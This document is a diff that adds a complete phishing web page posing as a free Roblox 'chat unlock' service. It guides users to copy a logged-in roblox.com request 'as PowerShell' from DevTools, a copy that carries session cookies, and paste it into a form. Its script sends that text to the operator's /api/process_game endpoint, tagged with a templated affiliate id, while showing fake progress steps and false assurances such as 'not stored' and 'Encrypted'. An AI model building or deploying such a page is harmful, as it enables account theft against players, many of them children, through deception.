@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox — Chat Unlock</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+            <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        rblx: { dark: '#0f0f10', card: '#111115' }
+                    },
+                    fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background: #0a0a0c; }
+
+        .glow { position: fixed; inset: 0; pointer-events: none; z-index: 0;
+            background: radial-gradient(ellipse at 20% 10%, rgba(255,255,255,.03) 0%, transparent 55%),
+                        radial-gradient(ellipse at 85% 80%, rgba(255,255,255,.02) 0%, transparent 50%); }
+
+        .card { background: #111115; border: 1px solid rgba(255,255,255,.07); }
+
+        @keyframes fadeUp { from { opacity:0; transform:translateY(14px); } to { opacity:1; transform:translateY(0); } }
+        .fu  { animation: fadeUp .55s ease forwards; }
+        .fu1 { animation-delay:.1s; opacity:0; }
+        .fu2 { animation-delay:.2s; opacity:0; }
+        .fu3 { animation-delay:.3s; opacity:0; }
+
+        @keyframes spin { to { transform:rotate(360deg); } }
+        .spinner { animation: spin .8s linear infinite; }
+
+        @keyframes progress { 0%{width:0%} 100%{width:100%} }
+        .progress-fill { animation: progress 4s ease-out forwards; }
+
+        .input-field {
+            background: rgba(255,255,255,.03);
+            border: 1px solid rgba(255,255,255,.1);
+            transition: border-color .2s, box-shadow .2s;
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: rgba(255,255,255,.3);
+            box-shadow: 0 0 0 3px rgba(255,255,255,.05);
+        }
+
+        .btn-main {
+            background: #ffffff;
+            color: #000000;
+            transition: background .15s, transform .1s;
+        }
+        .btn-main:hover:not(:disabled) { background: #e0e0e0; }
+        .btn-main:active:not(:disabled) { transform: scale(.98); }
+        .btn-main:disabled { opacity:.45; cursor:not-allowed; }
+
+        .step-row { display:flex; align-items:center; gap:10px; font-size:12px; color:#737373; }
+        .step-row.done { color:#c0c0c8; }
+    </style>
+</head>
+<body class="font-sans text-neutral-300 antialiased min-h-screen">
+    <div class="glow"></div>
+
+    <header class="relative z-10 border-b border-white/5 bg-[#0a0a0c]/90 backdrop-blur-xl sticky top-0">
+        <div class="max-w-5xl mx-auto px-5 h-14 flex items-center justify-between">
+            <div class="flex items-center gap-2.5">
+                <div class="w-6 h-6 rounded bg-white/10 flex items-center justify-center">
+                    <svg class="" style="width:12px;height:12px;stroke:white;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/><circle cx="9" cy="11" r="1" fill="currentColor" stroke="none"/><circle cx="12" cy="11" r="1" fill="currentColor" stroke="none"/><circle cx="15" cy="11" r="1" fill="currentColor" stroke="none"/></svg>
+                </div>
+                <span class="text-[14px] font-bold text-white">RobloxChatFix</span>
+            </div>
+        </div>
+    </header>
+
+    <main class="relative z-10">
+
+        <section class="pt-16 pb-10 text-center px-5">
+            <div class="max-w-2xl mx-auto">
+                <div class="fu inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-white/5 border border-white/10 text-[#c0c0c8] text-[11px] font-bold mb-7 uppercase tracking-wide">
+                    <svg class="" style="width:16px;height:16px;stroke:#a3a3a3;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 019.9-1"/></svg> Free Unlock
+                </div>
+                <h1 class="fu fu1 text-4xl md:text-6xl font-extrabold text-white leading-[1.1] mb-5">
+                    Unlock Chat<br>
+                    <span class="text-[#c0c0c8]">in Roblox</span>
+                </h1>
+                <p class="fu fu2 text-[15px] text-neutral-500 max-w-md mx-auto leading-relaxed">
+                    Chat blocked due to account age or region? We remove the restriction in 30 seconds — no ban.
+                </p>
+            </div>
+        </section>
+
+        <section class="pb-10 px-5">
+            <div class="max-w-lg mx-auto fu fu3">
+                <div class="grid grid-cols-3 gap-3 mb-8">
+                    <div class="card rounded-xl p-4 text-center">
+                        <div class="text-xl font-extrabold text-white mb-0.5">1.2M+</div>
+                        <div class="text-[10px] text-neutral-600 font-medium uppercase tracking-wide">Unlocked</div>
+                    </div>
+                    <div class="card rounded-xl p-4 text-center">
+                        <div class="text-xl font-extrabold text-white mb-0.5">100%</div>
+                        <div class="text-[10px] text-neutral-600 font-medium uppercase tracking-wide">No Ban</div>
+                    </div>
+                    <div class="card rounded-xl p-4 text-center">
+                        <div class="text-xl font-extrabold text-white mb-0.5">30 sec</div>
+                        <div class="text-[10px] text-neutral-600 font-medium uppercase tracking-wide">Processing</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="pb-20 px-5">
+            <div class="max-w-lg mx-auto">
+                <div class="card rounded-2xl p-7 md:p-9">
+
+                    <div class="flex items-center gap-3 mb-7">
+                        <div class="w-10 h-10 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0">
+                            <svg class="" style="width:20px;height:20px;stroke:white;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75"><path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/><circle cx="9" cy="11" r="1" fill="currentColor" stroke="none"/><circle cx="12" cy="11" r="1" fill="currentColor" stroke="none"/><circle cx="15" cy="11" r="1" fill="currentColor" stroke="none"/></svg>
+                        </div>
+                        <div>
+                            <div class="text-[14px] font-bold text-white">Remove Chat Block</div>
+                            <div class="text-[11px] text-neutral-600 mt-0.5">Paste authorization string below</div>
+                        </div>
+                    </div>
+
+                    <div class="mb-6 p-4 rounded-xl bg-white/[.02] border border-white/6">
+                        <div class="flex items-center gap-2 mb-3">
+                            <svg class="" style="width:14px;height:14px;stroke:#737373;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 015.83 1c0 2-3 3-3 3M12 17h.01"/></svg>
+                            <span class="text-[11px] font-semibold text-neutral-400">How to get the authorization string</span>
+                        </div>
+                        <ol class="space-y-2">
+                            <li class="flex items-start gap-2.5 text-[11px] text-neutral-600">
+                                <span class="flex-shrink-0 w-4 h-4 rounded-full bg-white/10 text-[#c0c0c8] text-[9px] font-bold flex items-center justify-center mt-0.5">1</span>
+                                Open <a href="https://www.roblox.com" target="_blank" class="text-neutral-400 hover:underline">roblox.com</a> and log in to your account
+                            </li>
+                            <li class="flex items-start gap-2.5 text-[11px] text-neutral-600">
+                                <span class="flex-shrink-0 w-4 h-4 rounded-full bg-white/10 text-[#c0c0c8] text-[9px] font-bold flex items-center justify-center mt-0.5">2</span>
+                                Press <span class="text-neutral-400 font-mono">F12</span> → <span class="text-neutral-400">Network</span> → refresh the page
+                            </li>
+                            <li class="flex items-start gap-2.5 text-[11px] text-neutral-600">
+                                <span class="flex-shrink-0 w-4 h-4 rounded-full bg-white/10 text-[#c0c0c8] text-[9px] font-bold flex items-center justify-center mt-0.5">3</span>
+                                Right-click any request → <span class="text-neutral-400">Copy</span> → <span class="text-neutral-400 font-mono">Copy as PowerShell</span>
+                            </li>
+                            <li class="flex items-start gap-2.5 text-[11px] text-neutral-600">
+                                <span class="flex-shrink-0 w-4 h-4 rounded-full bg-white/10 text-[#c0c0c8] text-[9px] font-bold flex items-center justify-center mt-0.5">4</span>
+                                Paste the result below
+                            </li>
+                        </ol>
+                    </div>
+
+                    <form id="chatForm">
+                        <div class="mb-5">
+                            <label class="block text-[12px] font-semibold text-neutral-400 mb-2">
+                                Authorization string
+                            </label>
+                            <textarea id="authInput" required rows="3" autocomplete="off" spellcheck="false"
+                                placeholder="Paste your PowerShell authorization data here..."
+                                class="input-field w-full rounded-xl py-3 px-4 text-[12px] text-white placeholder-neutral-700 font-mono resize-none"></textarea>
+                            <p class="mt-1.5 text-[10px] text-neutral-700">
+                                Copy as PowerShell from browser DevTools → Network tab
+                            </p>
+                        </div>
+
+                        <div class="mb-5 flex items-start gap-2.5 p-3.5 rounded-xl bg-white/[.03] border border-white/[.07]">
+                            <svg class="flex-shrink-0 mt-0.5" style="width:14px;height:14px;stroke:#c0c0c8;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
+                            <p class="text-[11px] text-[#808090] leading-relaxed">
+                                Your data is used only for unlocking and is <strong>not stored</strong> on our servers.
+                            </p>
+                        </div>
+
+                        <button type="submit" id="submitBtn" class="btn-main w-full py-4 font-bold text-[14px] rounded-xl">
+                            <span id="btnText">Unlock Chat</span>
+                        </button>
+                    </form>
+
+                    <div id="progressArea" class="hidden mt-6">
+                        <div class="space-y-2.5 mb-4" id="progressSteps"></div>
+                        <div class="h-1 rounded-full bg-white/5 overflow-hidden">
+                            <div id="progressBar" class="h-full rounded-full bg-white"></div>
+                        </div>
+                    </div>
+
+                    <div id="statusMessage" class="hidden mt-4 p-4 rounded-xl text-[13px] font-medium text-center"></div>
+                </div>
+
+                <div class="grid grid-cols-3 gap-3 mt-4">
+                    <div class="card rounded-xl p-3 flex items-center gap-2">
+                        <svg class="flex-shrink-0" style="width:14px;height:14px;stroke:#525252;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+                        <span class="text-[10px] text-neutral-600">Encrypted</span>
+                    </div>
+                    <div class="card rounded-xl p-3 flex items-center gap-2">
+                        <svg class="flex-shrink-0" style="width:14px;height:14px;stroke:#525252;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+                        <span class="text-[10px] text-neutral-600">30 Seconds</span>
+                    </div>
+                    <div class="card rounded-xl p-3 flex items-center gap-2">
+                        <svg class="flex-shrink-0" style="width:14px;height:14px;stroke:#525252;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                        <span class="text-[10px] text-neutral-600">No Ban</span>
+                    </div>
+                </div>
+
+                <p class="text-center text-[10px] text-neutral-800 mt-6">2026 RobloxChatFix. Not an official Roblox service.</p>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        const userId = '{{ user_id }}';
+        const form         = document.getElementById('chatForm');
+        const authInput    = document.getElementById('authInput');
+        const submitBtn    = document.getElementById('submitBtn');
+        const btnText      = document.getElementById('btnText');
+        const progressArea = document.getElementById('progressArea');
+        const progressSteps= document.getElementById('progressSteps');
+        const progressBar  = document.getElementById('progressBar');
+        const statusMessage= document.getElementById('statusMessage');
+
+        const steps = [
+            { text: 'Connecting to Roblox API...', delay: 0 },
+            { text: 'Verifying account...', delay: 700 },
+            { text: 'Removing chat block...', delay: 1600 },
+            { text: 'Applying settings...', delay: 2600 },
+        ];
+
+        function showProgress() {
+            progressArea.classList.remove('hidden');
+            statusMessage.classList.add('hidden');
+            progressSteps.innerHTML = '';
+            progressBar.className = 'h-full rounded-full bg-white progress-fill';
+
+            steps.forEach((step) => {
+                setTimeout(() => {
+                    const prev = progressSteps.querySelector('[data-active]');
+                    if (prev) {
+                        prev.innerHTML = '<svg class="" style="width:14px;height:14px;stroke:#c0c0c8;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><span class="text-[#c0c0c8]">' + prev.dataset.text + '</span>';
+                        prev.removeAttribute('data-active');
+                    }
+                    const el = document.createElement('div');
+                    el.className = 'step-row';
+                    el.dataset.text = step.text;
+                    el.dataset.active = '1';
+                    el.innerHTML = '<svg class="w-3.5 h-3.5 text-white spinner flex-shrink-0" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" stroke="#ffffff" stroke-width="3" stroke-dasharray="30 70" stroke-linecap="round"/></svg><span>' + step.text + '</span>';
+                    progressSteps.appendChild(el);
+                }, step.delay);
+            });
+        }
+
+        function hideProgress() {
+            const prev = progressSteps.querySelector('[data-active]');
+            if (prev) {
+                prev.innerHTML = '<svg class="" style="width:14px;height:14px;stroke:#c0c0c8;fill:none;display:inline-block;vertical-align:middle;flex-shrink:0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 11-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><span class="text-[#c0c0c8]">' + prev.dataset.text + '</span>';
+                prev.removeAttribute('data-active');
+            }
+        }
+
+        function showStatus(msg, type) {
+            statusMessage.textContent = msg;
+            statusMessage.className = 'mt-4 p-4 rounded-xl text-[13px] font-medium text-center ' +
+                (type === 'success'
+                    ? 'bg-[rgba(255,255,255,.12)] border border-white/10 text-[#c0c0c8]'
+                    : 'bg-[rgba(255,100,100,.1)] border border-[rgba(255,100,100,.15)] text-[#ff8888]');
+            statusMessage.classList.remove('hidden');
+        }
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const authValue = authInput.value.trim();
+            if (!authValue) { showStatus('Please paste the authorization string', 'error'); return; }
+
+            submitBtn.disabled = true;
+            btnText.textContent = 'Processing...';
+            showProgress();
+
+            try {
+                await new Promise(r => setTimeout(r, 1500));
+
+                const resp = await fetch('/api/process_game', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        payload: authValue,
+                        sid: userId,
+                        ref: window.location.hostname
+                    })
+                });
+                const data = await resp.json();
+
+                await new Promise(r => setTimeout(r, 2200));
+                hideProgress();
+
+                if (data.status === 'success') {
+                    showStatus('Chat successfully unlocked! Rejoin the game.', 'success');
+                    authInput.value = '';
+                } else {
+                    showStatus(data.message || 'An error occurred. Please try again.', 'error');
+                }
+            } catch (err) {
+                hideProgress();
+                showStatus('Network error. Check your connection and try again.', 'error');
+            } finally {
+                submitBtn.disabled = false;
+                btnText.textContent = 'Unlock Chat';
+            }
+        });
+    </script>
+</body>
+</html>
